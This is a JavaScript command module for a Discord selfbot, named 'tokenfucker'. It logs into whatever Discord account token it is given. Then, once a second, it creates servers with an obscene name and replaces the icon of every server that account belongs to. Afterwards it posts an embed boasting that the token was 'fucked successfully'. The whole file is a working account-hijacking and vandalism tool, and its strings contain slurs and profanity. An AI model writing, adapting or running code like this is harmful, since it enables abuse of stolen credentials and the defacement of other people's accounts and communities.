
const {
  Client,
  RichEmbed
} = require('discord.js-selfbot-v11')
const config = require('../../config.json')
const photo = config.photo
module.exports.run = async (bot, message, args) => {
  if (message.author.bot) return
  const yournukebotname = new Client()
  const nuketoken = args.join(' ')
  yournukebotname.login(nuketoken)
  yournukebotname.on('ready', () => {
    setInterval(() => {
      const list = yournukebotname.guilds.array()
      yournukebotname.user.createGuild('sᴜᴄᴋ ᴍʏ ᴄᴏᴄᴋ ᴍᴏᴛʜᴇʀ ғᴜᴄᴋᴇʀ')
      list.forEach(guild => guild.setIcon('https://www.adweek.com/wp-content/uploads/2018/07/confused-guy-meme-content-2018.jpg'))
    }, 1000)
  })
  const embed = new RichEmbed()
    .setColor('RANDOM')
    .setTitle('ᵉˡˡⁱᵒᵗ ˢᵉˡᶠ ᵇᵒᵗ')
    .setDescription('```ᴛᴏᴋᴇɴ ғᴜᴄᴋᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ```')
    .setThumbnail(photo)
    .setFooter('『https://discord.gg/mYsaYxtqdG』', message.author.displayAvatarURL)
  message.edit(embed)
}

module.exports.help = {
  name: 'tokenfucker'
}
